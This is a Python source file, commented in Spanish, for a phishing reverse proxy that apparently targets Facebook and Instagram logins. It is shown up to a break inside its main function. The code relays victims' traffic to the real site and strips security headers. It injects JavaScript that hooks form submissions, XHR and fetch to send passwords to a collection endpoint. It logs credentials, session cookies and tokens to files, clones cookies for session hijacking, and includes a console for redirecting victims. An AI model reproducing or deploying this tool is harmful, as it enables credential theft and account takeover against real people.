#!/usr/bin/env python3

import os, sys, json, re, ssl, socket, threading, time
from datetime import datetime
from urllib.parse import urlparse, parse_qs, unquote, urljoin
import warnings
warnings.filterwarnings('ignore')

try:
    import requests
    from flask import (Flask, request as freq, Response, make_response)
except ImportError:
    os.system("pip3 install requests flask -q")
    import requests
    from flask import (Flask, request as freq, Response, make_response)

try: requests.packages.urllib3.disable_warnings()
except: pass

BASE = os.path.dirname(os.path.abspath(__file__))

# Colores
R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'
M='\033[95m'; CY='\033[96m'; W='\033[97m'; BOLD='\033[1m'
DIM='\033[2m'; RST='\033[0m'

# Headers que NO se copian
SKIP_REQ = {'host','content-length','transfer-encoding','connection',
            'keep-alive','upgrade','proxy-connection','te','trailers'}

STRIP_RESP = {'transfer-encoding','connection','keep-alive','content-encoding',
              'content-length','content-security-policy','content-security-policy-report-only',
              'strict-transport-security','x-frame-options','x-content-type-options',
              'x-xss-protection','permissions-policy','cross-origin-opener-policy',
              'cross-origin-embedder-policy','cross-origin-resource-policy',
              'expect-ct','public-key-pins','report-to','nel'}

CRED_RE = re.compile(
    r'(pass|pwd|password|passwd|secret|token|auth|key|session|credential|'
    r'login|user|email|usr|account|pin|otp|code|2fa|mfa|enc_password|'
    r'username|phone|cel|numero)', re.I)


class MITMProxy:

    def __init__(self, target, port=8080, certfile=None, keyfile=None, follow_redirects=False, output_file=None):
        self.port = port
        self.certfile = certfile
        self.keyfile = keyfile
        self.follow_redirects = follow_redirects
        self.logfile = os.path.join(BASE, "captured.json")
        self.output_file = output_file
        self.captures = 0
        self.reqs = 0
        self.lock = threading.Lock()
        self.sessions = {}      # ip -> requests.Session (cookie jar propio)
        self.store = {}         # ip -> {cookies, tokens} para resumen
        self.redirects = {}     # global, per-ip, next
        self.one_redirects = {} # ip -> (target, used_flag)
        self.redirect_lock = threading.Lock()
        self.credentials = []   # Lista de todas las credenciales capturadas
        self.all_cookies = {}   # ip -> {cookie_name: cookie_value}

        # Target
        t = target.strip()
        if not t.startswith(('http://','https://')): t = 'https://' + t
        p = urlparse(t)
        self.scheme = p.scheme
        self.host = p.netloc
        self.origin = f"{p.scheme}://{p.netloc}"

        # Dominios del target (para reescribir URLs)
        base = self.host.replace('www.','')
        self.domains = set()
        for pfx in ['','www.','static.','api.','m.','i.','graph.','edge-chat.',
                     'upload.','scontent.','platform.','connect.','web.',
                     'accounts.','login.','l.','lm.','external.','z-m-scontent.',
                     'rupload.','edge-upload.','star.','pixel.','an.','tr.']:
            self.domains.add(f"{pfx}{base}")

        self.cdn_re = re.compile(
            r'(?:scontent|static|cdn|media|edge|z-m-scontent)[^./]*\.' + re.escape(base))

        # Flask
        self.app = Flask(__name__)
        import logging; logging.getLogger('werkzeug').setLevel(logging.ERROR)

        @self.app.route('/__ml__', methods=['POST'])
        def _ml():
            self._js_capture()
            return '', 204

        @self.app.route('/__check_redirect__', methods=['GET'])
        def _check_redirect():
            """Endpoint simple para que JS verifique si hay redirect"""
            ip = freq.remote_addr
            target = self._get_redirect_target(ip)
            if target:
                # Asegurar protocolo
                if not target.startswith(('http://', 'https://')):
                    target = 'http://' + target
                print(f"  {CY}[→] Redirect detectado: {ip} → {target}{RST}")
                return Response(target, mimetype='text/plain')
            return Response('', status=204)

        @self.app.route('/', defaults={'path':''}, methods=['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'])
        @self.app.route('/<path:path>', methods=['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'])
        def _proxy(path):
            return self._handle(path)

    # ===========================================================
    #  Session por cliente (cada IP tiene su cookie jar)
    # ===========================================================
    def _sess(self, ip):
        if ip not in self.sessions:
            s = requests.Session()
            s.verify = False
            s.max_redirects = 30
            s.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                              'AppleWebKit/537.36 (KHTML, like Gecko) '
                              'Chrome/125.0.0.0 Safari/537.36',
            })
            from requests.adapters import HTTPAdapter
            a = HTTPAdapter(pool_connections=20, pool_maxsize=40)
            s.mount("http://", a)
            s.mount("https://", a)
            self.sessions[ip] = s
            print(f"  {G}[+] Nueva sesion: {ip}{RST}")
        return self.sessions[ip]

    # ===========================================================
    #  PROXY HANDLER - REESCRITO DESDE CERO
    # ===========================================================
    def _handle(self, path):
        self.reqs += 1
        ip = freq.remote_addr
        sess = self._sess(ip)
        method = freq.method

        # URL destino
        tpath = f"/{path}"
        qs = freq.query_string.decode('utf-8', errors='replace')
        if qs: tpath += f"?{qs}"
        url = f"{self.origin}{tpath}"

        # Headers al backend
        hdrs = {}
        for k, v in freq.headers:
            if k.lower() in SKIP_REQ: continue
            if k.lower() in ('referer','origin'):
                v = self._to_real(v)
            hdrs[k] = v
        hdrs['Host'] = self.host
        hdrs['Accept-Encoding'] = 'identity'

        # Body
        body = freq.get_data() or None
        ct = freq.content_type or ''

        # Capturar POST
        if method in ('POST','PUT','PATCH') and body:
            self._sniff_post(ip, body, ct, url)

        # Sync cookies navegador -> session
        for cn, cv in freq.cookies.items():
            sess.cookies.set(cn, cv)

        # ===== MODO --fr: FULL RELAY =====
        if self.follow_redirects:
            final_resp = self._full_relay(sess, method, url, hdrs, body, ip)
        else:
            # MODO NORMAL: request directo sin seguir redirects
            try:
                final_resp = sess.request(
                    method=method, url=url, headers=hdrs,
                    data=body if method in ('POST','PUT','PATCH') else None,
                    allow_redirects=False, timeout=25, verify=False, stream=False
                )
            except Exception as e:
                print(f"  {R}[!] Error: {e}{RST}")
                return Response(f"<h1>502</h1><p>{e}</p>", status=502)

        # Capturar cookies
        self._sniff_cookies(ip, sess, url)

        # Preparar respuesta
        resp_body = final_resp.content
        resp_ct = final_resp.headers.get('Content-Type','')
        status = final_resp.status_code

        # Rewrite body
        if 'text/html' in resp_ct or 'xhtml' in resp_ct:
            resp_body = self._rw_html(resp_body, final_resp.encoding)
        elif any(x in resp_ct for x in ['javascript','text/css','text/xml']):
            resp_body = self._rw_text(resp_body, final_resp.encoding)
        elif 'json' in resp_ct:
            self._sniff_json(ip, resp_body, url)
            resp_body = self._rw_text(resp_body, final_resp.encoding)

        # Flask response
        fr = make_response(resp_body, status)
        
        # Copiar headers
        for k, v in final_resp.headers.items():
            kl = k.lower()
            if kl in STRIP_RESP: continue
            if kl == 'location': v = self._to_proxy(v)
            if kl == 'set-cookie': continue
            fr.headers[k] = v

        # Set-Cookie al navegador
        raw_sc = []
        if hasattr(final_resp, '_all_cookies'):
            # Cookies acumuladas en modo --fr
            raw_sc = final_resp._all_cookies
            if raw_sc:
                print(f"  {M}[FR] Clonando {len(raw_sc)} cookies al navegador{RST}")
        else:
            # Cookies de respuesta normal
            if hasattr(final_resp.raw, 'headers') and hasattr(final_resp.raw.headers, 'getlist'):
                raw_sc = final_resp.raw.headers.getlist('Set-Cookie')
            if not raw_sc:
                sc = final_resp.headers.get('Set-Cookie')
                if sc: raw_sc = [sc]
        
        for sc in raw_sc:
            fr.headers.add('Set-Cookie', self._fix_ck(sc))

        # INYECTAR POLLING JS EN TODAS LAS PÁGINAS HTML
        if 'text/html' in resp_ct:
            # JS que hace polling para verificar redirects
            polling_js = '''<script type="text/javascript">
(function(){
    var checkInterval = setInterval(function(){
        fetch("/__check_redirect__", {method: "GET", cache: "no-cache"})
        .then(function(r){
            if(r.status === 200) {
                return r.text();
            }
            return null;
        })
        .then(function(target){
            if(target && target.length > 0) {
                console.log("[REDIRECT] Redirigiendo a:", target);
                clearInterval(checkInterval);
                window.location.replace(target);
            }
        })
        .catch(function(e){
            console.error("[REDIRECT] Error:", e);
        });
    }, 500);
})();
</script>'''
            # Inyectar al principio del HTML
            body_str = resp_body if isinstance(resp_body, str) else resp_body.decode('utf-8', errors='replace')
            
            if '<head>' in body_str:
                body_str = body_str.replace('<head>', '<head>' + polling_js, 1)
            elif '<head' in body_str:
                body_str = re.sub(r'<head([^>]*)>', r'<head\1>' + polling_js, body_str, count=1)
            elif '<html>' in body_str:
                body_str = body_str.replace('<html>', '<html>' + polling_js, 1)
            elif '<html' in body_str:
                body_str = re.sub(r'<html([^>]*)>', r'<html\1>' + polling_js, body_str, count=1)
            else:
                body_str = polling_js + body_str
            
            resp_body = body_str.encode('utf-8') if isinstance(resp_body, bytes) else body_str
            fr.set_data(resp_body)

        # Log
        mc = G if method == 'GET' else Y
        sc_c = G if status < 300 else (CY if status < 400 else R)
        print(f"  {mc}{method:6}{RST} {sc_c}{status}{RST} {tpath[:70]}")

        return fr

    # ===========================================================
    #  GET REDIRECT TARGET
    # ===========================================================
    def _get_redirect_target(self, ip):
        """Obtiene el target de redirect si está configurado"""
        with self.redirect_lock:
            # One-time redirect (se elimina después de usar)
            if ip in self.one_redirects:
                target, used = self.one_redirects[ip]
                if not used:
                    self.one_redirects[ip] = (target, True)
                    return target
                else:
                    del self.one_redirects[ip]
            
            # Next redirect (se elimina después de usar)
            if 'next' in self.redirects:
                target = self.redirects['next']
                del self.redirects['next']
                return target
            
            # Per-IP redirect (PERMANENTE hasta que se limpie)
            if ip in self.redirects:
                return self.redirects[ip]
            
            # Global redirect (PERMANENTE hasta que se limpie)
            if 'global' in self.redirects:
                return self.redirects['global']
        
        return None

    # ===========================================================
    #  FULL RELAY (MODO --fr)
    # ===========================================================
    def _full_relay(self, sess, method, url, hdrs, body, ip):
        """
        MODO --fr: Suplanta la sesión completamente.
        """
        print(f"  {M}[FR] Full Relay activado{RST}")
        
        all_cookies = []
        current_url = url
        current_method = method
        current_body = body
        current_hdrs = dict(hdrs)
        visited = set()
        max_hops = 20
        
        for hop in range(max_hops):
            key = f"{current_method}:{current_url}"
            if key in visited:
                print(f"  {Y}[FR] Loop detectado{RST}")
                break
            visited.add(key)
            
            # Request
            try:
                resp = sess.request(
                    method=current_method,
                    url=current_url,
                    headers=current_hdrs,
                    data=current_body if current_method in ('POST','PUT','PATCH') else None,
                    allow_redirects=False,
                    timeout=25,
                    verify=False,
                    stream=False
                )
            except Exception as e:
                print(f"  {R}[FR] Error: {e}{RST}")
                if hop > 0 and all_cookies:
                    resp._all_cookies = all_cookies
                    return resp
                raise
            
            # Capturar y aplicar cookies INMEDIATAMENTE
            hop_cookies = []
            if hasattr(resp.raw, 'headers') and hasattr(resp.raw.headers, 'getlist'):
                hop_cookies = resp.raw.headers.getlist('Set-Cookie')
            
            if hop_cookies:
                all_cookies.extend(hop_cookies)
                # IMPORTANTE: Aplicar cookies a la sesión AHORA
                for cookie_str in hop_cookies:
                    try:
                        # Parsear la cookie
                        cookie_line = cookie_str.split(';')[0].strip()
                        if '=' in cookie_line:
                            name, value = cookie_line.split('=', 1)
                            sess.cookies.set(name.strip(), value.strip())
                            print(f"  {G}[FR] Cookie aplicada: {name.strip()}={value.strip()[:20]}...{RST}")
                    except Exception as e:
                        print(f"  {Y}[FR] Error parseando cookie: {e}{RST}")
                
                print(f"  {G}[FR] Hop {hop+1}: {resp.status_code} | {len(hop_cookies)} cookies aplicadas{RST}")
            else:
                print(f"  {DIM}[FR] Hop {hop+1}: {resp.status_code} | 0 cookies{RST}")
            
            # Si NO es redirect, terminamos
            if resp.status_code not in (301, 302, 303, 307, 308):
                print(f"  {G}[FR] ✓ Respuesta final: {resp.status_code} {urlparse(current_url).path}{RST}")
                resp._all_cookies = all_cookies
                return resp
            
            # Es redirect
            location = resp.headers.get('Location', '')
            if not location:
                resp._all_cookies = all_cookies
                return resp
            
            # Hacer absoluta
            if not location.startswith('http'):
                location = urljoin(current_url, location)
            
            print(f"  {DIM}  └→ {resp.status_code} → {urlparse(location).path}{RST}")
            
            # Siguiente hop
            if resp.status_code in (301, 302, 303):
                current_method = 'GET'
                current_body = None
            
            # Actualizar headers para siguiente request
            parsed = urlparse(location)
            current_hdrs = {
                'Host': parsed.netloc,
                'User-Agent': sess.headers.get('User-Agent', ''),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'identity',
                'Referer': current_url,
            }
            current_url = location
        
        print(f"  {Y}[FR] Max hops alcanzados{RST}")
        resp._all_cookies = all_cookies
        return resp

    # ===========================================================
    #  REWRITE (CODIGO ORIGINAL)
    # ===========================================================
    def _to_proxy(self, url):
        if not url: return url
        for d in self.domains:
            url = url.replace(f"https://{d}", "")
            url = url.replace(f"http://{d}", "")
        return url or '/'

    def _to_real(self, url):
        if not url: return url
        p = urlparse(url)
        if not p.netloc or str(self.port) in str(p.netloc):
            return f"{self.origin}{p.path or '/'}{'?' + p.query if p.query else ''}"
        return url

    def _fix_ck(self, s):
        if not s: return s
        s = s.replace('__Secure-','').replace('__Host-','')
        s = re.sub(r';\s*[Dd]omain=[^;]*', '', s)
        s = re.sub(r';\s*[Ss]ecure\b', '', s)
        s = re.sub(r';\s*[Ss]ame[Ss]ite\s*=\s*\w+', '; SameSite=Lax', s)
        s = re.sub(r';\s*[Pp]ath=[^;]*', '; Path=/', s)
        return s

    # ===========================================================
    #  BODY REWRITING (CODIGO ORIGINAL)
    # ===========================================================
    def _dec(self, b, enc):
        for e in [enc, 'utf-8', 'latin-1']:
            if e:
                try: return b.decode(e)
                except: continue
        return b.decode('utf-8', errors='replace')

    def _url_replace(self, text):
        for d in self.domains:
            text = text.replace(f"https://{d}", "")
            text = text.replace(f"http://{d}", "")
            text = text.replace(f"https:\\/\\/{d}", "")
            text = text.replace(f"http:\\/\\/{d}", "")
            text = text.replace(f"//{d}", "")
        text = self.cdn_re.sub("", text)
        return text

    def _rw_html(self, body, enc):
        t = self._url_replace(self._dec(body, enc))
        js = self._inject_js()
        for tag in ['</head>','</body>','</html>']:
            if tag in t:
                t = t.replace(tag, f'{js}{tag}', 1)
                break
        else:
            t += js
        return t.encode('utf-8', errors='replace')

    def _rw_text(self, body, enc):
        return self._url_replace(self._dec(body, enc)).encode('utf-8', errors='replace')

    # ===========================================================
    #  JS INYECTADO (CODIGO ORIGINAL)
    # ===========================================================
    def _inject_js(self):
        return '''<script>
(function(){
var P=function(d){try{navigator.sendBeacon("/__ml__",JSON.stringify(d));}catch(e){
try{var x=new XMLHttpRequest();x.open("POST","/__ml__",true);
x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify(d));}catch(e2){}}};

document.addEventListener("submit",function(e){
var f=e.target;if(!f||f.tagName!=="FORM")return;
var d={};var inps=f.querySelectorAll("input,textarea,select");
for(var i=0;i<inps.length;i++){var inp=inps[i];
if(inp.name&&inp.value){d[inp.name]=inp.value;
if(inp.type==="password")d["__PWD__"]=inp.value;}}
P({t:"f",a:f.action,d:d});},true);

var XO=XMLHttpRequest.prototype.open,XS=XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.open=function(m,u){this._m=m;this._u=u;return XO.apply(this,arguments);};
XMLHttpRequest.prototype.send=function(b){
if(b&&(this._m==="POST"||this._m==="PUT"))
P({t:"x",m:this._m,u:this._u,b:typeof b==="string"?b:null});
return XS.apply(this,arguments);};

if(window.fetch){var F=window.fetch;
window.fetch=function(u,o){o=o||{};
if(o.body&&(o.method==="POST"||o.method==="PUT")){
try{var s=null;
if(typeof o.body==="string")s=o.body;
else if(o.body instanceof URLSearchParams)s=o.body.toString();
if(s)P({t:"h",m:o.method,u:typeof u==="string"?u:"",b:s});}catch(e){}}
return F.apply(this,arguments);};}

var es=new EventSource("/__redir__");
es.onmessage=function(e){if(e.data){window.location.href=e.data;es.close();}};
})();
</script>'''

    # ===========================================================
    #  SNIFFERS (CODIGO ORIGINAL)
    # ===========================================================
    def _sniff_post(self, ip, body, ct, url):
        try: bs = body.decode('utf-8', errors='replace')
        except: return
        fields = {}
        if 'urlencoded' in ct or ('&' in bs and '=' in bs):
            try:
                for k, v in parse_qs(bs, keep_blank_values=True).items():
                    fields[k] = v[0] if v else ''
            except: pass
        elif 'json' in ct:
            try:
                j = json.loads(bs)
                if isinstance(j, dict): self._flat(j, fields)
            except: pass
        elif 'multipart' in ct:
            for m in re.finditer(r'name="([^"]+)"[\r\n]+([^\r\n-]+)', bs):
                fields[m.group(1)] = m.group(2).strip()
        if not fields and '=' in bs:
            for pair in bs.split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    fields[unquote(k)] = unquote(v)
        if not fields: return
        sens = {k: v for k, v in fields.items() if CRED_RE.search(k) and v}
        if sens:
            self._log(ip, 'CREDENTIALS', url, sens, fields)
        else:
            self._log(ip, 'POST_DATA', url, fields)

    def _flat(self, obj, r, pfx=''):
        if isinstance(obj, dict):
            for k, v in obj.items():
                f = f"{pfx}.{k}" if pfx else k
                if isinstance(v, (dict,list)): self._flat(v, r, f)
                else: r[f] = str(v) if v is not None else ''
        elif isinstance(obj, list):
            for i, x in enumerate(obj): self._flat(x, r, f"{pfx}[{i}]")

    def _sniff_cookies(self, ip, sess, url):
        interesting = {}
        for c in sess.cookies:
            nl = c.name.lower()
            if any(x in nl for x in ['session','token','auth','sid','jwt','access',
                    'refresh','login','sso','csrf','c_user','xs','fr','ds_user',
                    'datr','sb','dpr','wd','presence']):
                interesting[c.name] = c.value[:200]
        if interesting:
            prev = self.store.get(ip, {}).get('cookies', {})
            new_ck = {k: v for k, v in interesting.items() if k not in prev or prev[k] != v}
            if new_ck:
                self._log(ip, 'COOKIES', url, new_ck)
                with self.lock:
                    if ip not in self.store:
                        self.store[ip] = {'cookies': {}, 'tokens': []}
                    self.store[ip]['cookies'].update(interesting)

    def _sniff_json(self, ip, body, url):
        try:
            j = json.loads(body.decode('utf-8', errors='replace'))
            if isinstance(j, dict):
                tk = {}; self._find_tk(j, tk)
                if tk:
                    self._log(ip, 'TOKENS', url, tk)
                    with self.lock:
                        if ip not in self.store:
                            self.store[ip] = {'cookies': {}, 'tokens': []}
                        self.store[ip]['tokens'].append(tk)
        except: pass

    def _find_tk(self, obj, r, pfx=''):
        TK = re.compile(r'(token|access_token|refresh_token|id_token|jwt|api_key|session_id|bearer|secret)', re.I)
        if isinstance(obj, dict):
            for k, v in obj.items():
                f = f"{pfx}.{k}" if pfx else k
                if isinstance(v, str) and TK.search(k) and len(v) > 5: r[f] = v[:200]
                elif isinstance(v, (dict,list)): self._find_tk(v, r, f)

    def _js_capture(self):
        try:
            data = freq.get_json(silent=True)
            if not data:
                try: data = json.loads(freq.get_data(as_text=True))
                except: return
            ip = freq.remote_addr
            t = data.get('t','')
            if t == 'f':
                flds = data.get('d', {})
                if isinstance(flds, dict) and flds:
                    sens = {k: v for k, v in flds.items() if CRED_RE.search(k) and v}
                    if sens: self._log(ip, 'FORM_CREDS', data.get('a',''), sens, flds)
            elif t in ('x','h'):
                b = data.get('b','')
                if b: self._sniff_post(ip, b.encode(), 'application/x-www-form-urlencoded', data.get('u',''))
        except: pass

    # ===========================================================
    #  LOGGING
    # ===========================================================
    def _log(self, ip, tipo, url, data, all_f=None):
        self.captures += 1
        e = {'id': self.captures, 'ts': datetime.now().isoformat(),
             'type': tipo, 'ip': ip, 'url': url, 'data': data}
        if all_f: e['all_fields'] = all_f
        
        # Guardar credenciales siempre
        if tipo in ('CREDENTIALS', 'FORM_CREDS'):
            self.credentials.append({
                'ts': e['ts'],
                'ip': ip,
                'url': url,
                'credentials': data
            })
        
        # Guardar cookies organizadas por IP
        if tipo == 'COOKIES':
            if ip not in self.all_cookies:
                self.all_cookies[ip] = {}
            self.all_cookies[ip].update(data)
        
        with self.lock:
            try:
                # Guardar en captured.json (log completo)
                a = []
                if os.path.exists(self.logfile):
                    with open(self.logfile) as f: a = json.load(f)
                a.append(e)
                with open(self.logfile, 'w') as f: 
                    json.dump(a, f, indent=2, ensure_ascii=False)
                
                # Guardar estructura limpia en credentials.json
                creds_file = os.path.join(BASE, "credentials.json")
                with open(creds_file, 'w') as f:
                    json.dump({
                        'credentials': self.credentials,
                        'cookies': {ip: dict(sorted(ck.items())) for ip, ck in self.all_cookies.items()}
                    }, f, indent=2, ensure_ascii=False)
                
                # Output file opcional (-O)
                if self.output_file:
                    with open(self.output_file, 'a') as f:
                        log_line = f"[{e['ts']}] [{e['type']}] {ip} -> {url}\n"
                        if tipo in ('CREDENTIALS', 'FORM_CREDS'):
                            for k, v in data.items():
                                log_line += f"  {k}: {v}\n"
                        elif tipo == 'COOKIES':
                            for k, v in data.items():
                                log_line += f"  {k}: {v[:60]}\n"
                        log_line += "\n"
                        f.write(log_line)
            except Exception as ex:
                print(f"{R}[!] Log error: {ex}{RST}")
        
        self._show(e)

    def _show(self, e):
        clrs = {'CREDENTIALS': R, 'FORM_CREDS': R, 'COOKIES': M,
                'TOKENS': CY, 'POST_DATA': Y}
        c = clrs.get(e['type'], W)
        print(f"\n{c}{'='*70}")
        print(f"  [{e['type']}] #{e['id']}")
        print(f"{'='*70}{RST}")
        print(f"  {DIM}Hora:{RST} {e['ts']}")
        print(f"  {DIM}IP:{RST}   {e['ip']}")
        print(f"  {DIM}URL:{RST}  {e['url'][:80]}")

        if e['type'] in ('CREDENTIALS','FORM_CREDS'):
            print(f"\n  {R}{BOLD}*** CREDENCIALES ***{RST}")
            for k, v in e['data'].items():
                kl = k.lower()
                if any(x in kl for x in ['pass','pwd','secret','__pwd']):
                    print(f"  {R}{BOLD}  PASSWORD: {v}{RST}")
                elif any(x in kl for x in ['user','email','login','phone','account']):
                    print(f"  {G}{BOLD}  USUARIO:  {v}{RST}")
                elif any(x in kl for x in ['token','auth']):
                    print(f"  {CY}  TOKEN:   {v[:80]}{RST}")
                else:
                    print(f"  {Y}  {k}: {v}{RST}")
            if e.get('all_fields'):
                extra = {k: v for k, v in e['all_fields'].items() if k not in e['data']}
                if extra:
                    print(f"  {DIM}Otros:{RST}")
                    for k, v in extra.items(): print(f"  {DIM}  {k}: {v}{RST}")

        elif e['type'] == 'COOKIES':
            print(f"  {M}{BOLD}Cookies:{RST}")
            for k, v in e['data'].items():
                print(f"  {M}  {k}: {str(v)[:70]}{RST}")

        elif e['type'] == 'TOKENS':
            print(f"  {CY}Tokens:{RST}")
            for k, v in e['data'].items():
                print(f"  {CY}  {k}: {str(v)[:80]}{RST}")
        else:
            for k, v in e['data'].items():
                print(f"  {Y}  {k}: {str(v)[:100]}{RST}")
        print(f"{c}{'='*70}{RST}")

    # ===========================================================
    #  REDIRECT SYSTEM (NUEVAS FUNCIONALIDADES)
    # ===========================================================
    def _do_redirect(self, target):
        return Response(
            f'<html><head><meta http-equiv="refresh" content="0;url={target}"></head></html>',
            status=302, headers={'Location': target}
        )

    def set_redirect(self, scope, target):
        with self.redirect_lock:
            if scope == 'next':
                self.redirects['next'] = target
                print(f"  {G}[R] Next request → {target}{RST}")
            elif scope == 'global':
                self.redirects['global'] = target
                print(f"  {G}[R] Global redirect (instant) → {target}{RST}")
            else:
                self.redirects[scope] = target
                print(f"  {G}[R] Redirect for {scope} (instant) → {target}{RST}")

    def set_one_redirect(self, ip, target):
        with self.redirect_lock:
            self.one_redirects[ip] = (target, False)
            print(f"  {G}[R] One-time redirect (instant) for {ip} → {target}{RST}")

    def clear_redirect(self, scope=None):
        """Alias: clean redirects"""
        self.clean_redirect(scope)
    
    def clean_redirect(self, scope=None):
        with self.redirect_lock:
            if scope:
                if scope in self.redirects:
                    del self.redirects[scope]
                    print(f"  {Y}[R] Cleaned redirect: {scope}{RST}")
                elif scope in self.one_redirects:
                    del self.one_redirects[scope]
                    print(f"  {Y}[R] Cleaned one_redirect: {scope}{RST}")
            else:
                self.redirects.clear()
                self.one_redirects.clear()
                print(f"  {Y}[R] Cleaned all redirects{RST}")

    # ===========================================================
    #  START
    # ===========================================================
    def start(self):
        lip = _lip()
        proto = "https" if self.certfile and self.keyfile else "http"
        print(f"\n{M}{'='*70}")
        print(f"{'MITM REVERSE PROXY'.center(70)}")
        print(f"{'='*70}{RST}")
        print(f"  {BOLD}Proxy:{RST}    {proto}://0.0.0.0:{self.port}")
        print(f"  {BOLD}LAN:{RST}      {proto}://{lip}:{self.port}")
        print(f"  {BOLD}Target:{RST}   {self.origin}")
        print(f"  {BOLD}Logs:{RST}")
        print(f"    - Full log:     {self.logfile}")
        print(f"    - Credentials:  {os.path.join(BASE, 'credentials.json')}")
        if self.output_file:
            print(f"    - Text output:  {self.output_file}")
        if self.follow_redirects:
            print(f"  {BOLD}Mode:{RST}     --fr (Follow redirects + clone ALL cookies)")
        else:
            print(f"  {BOLD}Mode:{RST}     Normal (cookies from final response only)")
        print()
        print(f"\n  {DIM}Ctrl+C para detener{RST}")
        print(f"{M}{'='*70}{RST}\n")

        try:
            ctx = None
            if self.certfile and self.keyfile:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(self.certfile, self.keyfile)
            self.app.run(host='0.0.0.0', port=self.port, debug=False,
                        threaded=True, ssl_context=ctx)
        except KeyboardInterrupt:
            self._end()
        except OSError as e:
            if 'Address already in use' in str(e):
                print(f"{R}[-] Puerto {self.port} en uso{RST}")
                print(f"    kill -9 $(lsof -ti:{self.port})")

    def _end(self):
        print(f"\n{M}{'='*70}\n{'RESUMEN'.center(70)}\n{'='*70}{RST}")
        print(f"  Requests: {self.reqs} | Capturas: {self.captures} | Clientes: {len(self.sessions)}")
        for sip, data in self.store.items():
            nc = len(data.get('cookies',{}))
            print(f"\n  {G}{sip}{RST}: {nc} cookies")
            for n, v in data.get('cookies',{}).items():
                print(f"    {DIM}{n}: {v[:60]}{RST}")
        print(f"\n  Archivo: {self.logfile}")
        print(f"{M}{'='*70}{RST}\n")


def _lip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1); s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"

def _arg(f, d=None):
    if f in sys.argv:
        try: return sys.argv[sys.argv.index(f)+1]
        except: pass
    return d

def _has_flag(f):
    return f in sys.argv

def _gen_ssl_cert(cert_path, key_path):
    try:
        from OpenSSL import crypto
    except ImportError:
        os.system("pip3 install pyopenssl -q")
        from OpenSSL import crypto
    
    k = crypto.PKey()
    k.generate_key(crypto.TYPE_RSA, 2048)
    
    cert = crypto.X509()
    cert.get_subject().C = "US"
    cert.get_subject().ST = "State"
    cert.get_subject().L = "City"
    cert.get_subject().O = "Organization"
    cert.get_subject().OU = "Unit"
    cert.get_subject().CN = "localhost"
    
    cert.set_serial_number(1000)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(365*24*60*60)
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(k)
    cert.sign(k, 'sha256')
    
    with open(cert_path, "wb") as f:
        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
    with open(key_path, "wb") as f:
        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
    
    print(f"  {G}[+] SSL certificate generated:{RST}")
    print(f"      {cert_path}")
    print(f"      {key_path}")

def _interactive_cli(proxy):
    try:
        from prompt_toolkit import PromptSession
        from prompt_toolkit.completion import WordCompleter
    except ImportError:
        os.system("pip3 install prompt_toolkit -q")
        from prompt_toolkit import PromptSession
        from prompt_toolkit.completion import WordCompleter
    
    commands = WordCompleter(['redirect', 'next_redirect', 'one_redirect', 'clean', 'clear', 'exit', 'help', 'status'], ignore_case=True)
    session = PromptSession(completer=commands)
    
    print(f"\n{CY}Interactive CLI started. Type 'help' for commands.{RST}\n")
    
    while True:
        try:
            cmd = session.prompt('> ').strip()
            if not cmd:
                continue
            
            parts = cmd.split(None, 2)
            action = parts[0].lower()
            
            if action == 'exit':
                print(f"{Y}Exiting CLI...{RST}")
                break
            
            elif action == 'help':
                print(f"\n{CY}Available commands:{RST}")
                print(f"  {G}redirect global <url>{RST}       - Instant global redirect")
                print(f"  {G}redirect <ip> <url>{RST}         - Instant per-IP redirect")
                print(f"  {G}next_redirect <url>{RST}         - Redirect only next request")
                print(f"  {G}one_redirect <ip> <url>{RST}     - Instant redirect once (auto-clear after)")
                print(f"  {G}clean [global|<ip>]{RST}         - Clean redirect(s)")
                print(f"  {G}clear{RST}                       - Clear console")
                print(f"  {G}status{RST}                      - Show active redirects")
                print(f"  {G}exit{RST}                        - Exit CLI\n")
            
            elif action == 'redirect':
                if len(parts) < 3:
                    print(f"{R}Usage: redirect <global|ip> <url>{RST}")
                    continue
                scope = parts[1]
                target = parts[2]
                proxy.set_redirect(scope, target)
            
            elif action == 'next_redirect':
                if len(parts) < 2:
                    print(f"{R}Usage: next_redirect <url>{RST}")
                    continue
                target = parts[1]
                proxy.set_redirect('next', target)
            
            elif action == 'one_redirect':
                if len(parts) < 3:
                    print(f"{R}Usage: one_redirect <ip> <url>{RST}")
                    continue
                ip = parts[1]
                target = parts[2]
                proxy.set_one_redirect(ip, target)
            
            elif action == 'clean':
                if len(parts) > 1:
                    proxy.clean_redirect(parts[1])
                else:
                    proxy.clean_redirect()
            
            elif action == 'clear':
                os.system('clear' if os.name != 'nt' else 'cls')
            
            elif action == 'status':
                with proxy.redirect_lock:
                    if not proxy.redirects and not proxy.one_redirects:
                        print(f"  {DIM}No active redirects{RST}")
                    else:
                        if proxy.redirects:
                            print(f"\n{CY}Active redirects:{RST}")
                            for scope, target in proxy.redirects.items():
                                print(f"  {G}{scope:15}{RST} → {target}")
                        if proxy.one_redirects:
                            print(f"\n{CY}One-time redirects:{RST}")
                            for ip, (target, used) in proxy.one_redirects.items():
                                status = f"{R}USED{RST}" if used else f"{G}PENDING{RST}"
                                print(f"  {G}{ip:15}{RST} → {target} [{status}]")
                        print()
            
            else:
                print(f"{R}Unknown command: {action}. Type 'help' for available commands.{RST}")
        
        except KeyboardInterrupt:
            print(f"\n{Y}Use 'exit' to quit{RST}")
        except EOFError:
            break
        except Exception as e:
            print(f"{R}Error: {e}{RST}")

def main():
    print(f"""
{M}{'='*70}
